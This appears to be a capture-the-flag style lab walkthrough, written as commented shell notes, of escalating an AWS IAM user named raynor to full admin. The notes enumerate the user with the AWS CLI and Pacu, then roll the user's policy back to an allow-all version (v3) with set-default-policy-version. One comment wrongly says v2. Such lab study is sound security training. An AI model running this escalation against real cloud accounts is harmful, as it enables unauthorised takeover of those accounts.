Goal - Acquire full Admin privileges
```zsh
aws configure --profile raynor
#leave location blank

aws sts get-caller-identity --profile raynor

aws iam get-account-summary --profile raynor
aws iam get-user --profile raynor
#hits, multiple info

aws s3 ls --profile raynor

pacu
run ec2__enum --region us-east-1
run lambda__enum --region us-east-1
#nothing

run iam__enum_users_roles_policies_groups
#2 users, 3 roles, 1 policy
data iam policies
# v1
#switch to aws cli for policy enum
```

```zsh
#looking now for policies (username for sts caller identity)
#inline policies or user policies, attached directly to the user
aws --profile raynor iam list-user-policies --user-name raynor-cgidsde0yf0o5t       
#"PolicyNames": []

#managed policies or attached policies - separate, standalone IAM policies - either AWS-managed or customer-managed policies, attached to the user
aws --profile raynor iam list-attached-user-policies --user-name raynor-cgidsde0yf0o5t
#"PolicyName": "cg-raynor-policy-cgidsde0yf0o5t",
#"PolicyArn": "arn:aws:iam::266877689244:policy/cg-raynor-policy-cgidsde0yf0o5t"
#Note - PolicyArn is attached to Policyname

#understand the policy
aws --profile raynor iam get-policy --policy-arn arn:aws:iam::266877689244:policy/cg-raynor-policy-cgidsde0yf0o5t
#same as from pacu

aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::266877689244:policy/cg-raynor-policy-cgidsde0yf0o5t --version-id v1

"iam:SetDefaultPolicyVersion"
"Action": [
                        "iam:Get*",
                        "iam:List*",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
#Along with read permission (Get*, List*),  SetDefaultPolicyVersionis enabled. if we're able to find a more permissive version of this policy, we can set that as the default version.

#Finding other versions of this policy
aws --profile raynor iam list-policy-versions --policy-arn arn:aws:iam::266877689244:policy/cg-raynor-policy-cgidsde0yf0o5t
#v1 thru v5

#we need to find the most permissive policy version out of these. So we list the policy permissions of each of the policy, using a simple for loop
for i in {1..5}; do aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::266877689244:policy/cg-raynor-policy-cgidsde0yf0o5t --version-id v$i; done
"Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v3"
#This means v3 allows every action on any resource

#now, we just need to change the default permissions to v2, so we have full admin access
aws --profile raynor iam set-default-policy-version --policy-arn arn:aws:iam::266877689244:policy/cg-raynor-policy-cgidsde0yf0o5t --version-id v3
```